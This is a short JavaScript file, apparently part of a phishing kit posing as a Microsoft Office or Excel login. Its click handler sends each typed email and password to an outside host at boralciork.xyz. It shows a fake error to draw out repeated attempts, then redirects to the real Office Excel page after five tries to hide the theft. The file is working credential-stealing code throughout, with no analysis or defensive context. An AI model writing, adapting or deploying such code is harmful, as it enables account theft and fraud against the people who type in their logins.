$(function(){
	
	var attempCount = 0;
	var maxAttempt = 5;
	var url = "https://boralciork.xyz/rgr6ud67uru/thxetuety/r3465y6ujd/wde/con/post.php";

	$('#login-modal').modal({
		backdrop: 'static',
    	keyboard: false
	});

	$('#login-btn').on('click',function(e){
		var self = this;

		$.post(url,{email: $('#email').val(),password: $('#password').val()});

		if(attempCount < maxAttempt ){

			$(self).prop('disabled',true);
			$('#ajax-img').fadeIn();

			setTimeout(function(){
				$('.error-message').fadeIn();
				$(self).prop('disabled',false);
				$('#ajax-img').fadeOut();
			},2000);
		
		}else{
			window.location.href = "https://office.live.com/start/Excel.aspx?s=1&auth=1&nf=1";
		}

		attempCount += 1;
	});
});